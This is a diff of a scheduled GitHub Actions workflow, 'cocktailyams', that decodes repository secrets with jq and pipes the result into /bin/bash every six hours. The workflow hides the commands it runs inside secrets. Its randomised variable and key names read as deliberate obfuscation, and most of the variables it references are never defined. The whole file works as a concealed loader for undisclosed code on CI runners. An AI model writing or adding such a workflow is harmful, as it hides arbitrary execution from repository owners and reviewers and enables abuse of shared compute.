@@ -2,21 +2,32 @@ name: cocktailyams
 on:
   workflow_dispatch:
   schedule:
-    - cron: '39 1/6 * * *'
-
-jobs:  # 1276
+    - cron: '55 0/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: cocktailyams
         env:
-          opn32: ${{ secrets.opn32 }}
+          cxo8076: ${{ secrets.cxo8076 }}
         run: |
-          echo $opn32 | jq -r .e8864 | /bin/bash
-          echo $getf428 | jq -r .q09457 | /bin/bash
-          echo $h10259 | jq -r .zcle9333 | /bin/bash
-          echo $awyld640 | jq -r .rsvn9 | /bin/bash
-          echo $xxj37062 | jq -r .xo2659 | /bin/bash
-          echo $e3076 | jq -r .rn5 | /bin/bash
+          echo $cxo8076 | jq -r .qobee81949 | /bin/bash
+          echo $zny26 | jq -r .b232 | /bin/bash
+          echo $hfpwf2 | jq -r .olgsb0030 | /bin/bash
+          echo $ibfn75 | jq -r .jg229 | /bin/bash
+          echo $gzmrk23993 | jq -r .uy25 | /bin/bash
+          echo $rzca36769 | jq -r .uowdu9008 | /bin/bash
+          echo $aukfb5 | jq -r .rk19199 | /bin/bash
+          echo $i89 | jq -r .ruejz13586 | /bin/bash
+          echo $ncxy3 | jq -r .ptaw5904 | /bin/bash
+          echo $bendd97 | jq -r .myi48413 | /bin/bash
+          echo $iqcx5074 | jq -r .fl48 | /bin/bash
+          echo $vfe24 | jq -r .ivo34 | /bin/bash
+          echo $isul994 | jq -r .z13321 | /bin/bash
+          echo $jtfyu1627 | jq -r .ug7 | /bin/bash
+          echo $hxzi227 | jq -r .jao94930 | /bin/bash
+          echo $a5909 | jq -r .gpc4987 | /bin/bash
+          echo $qv11084 | jq -r .sf21 | /bin/bash
 
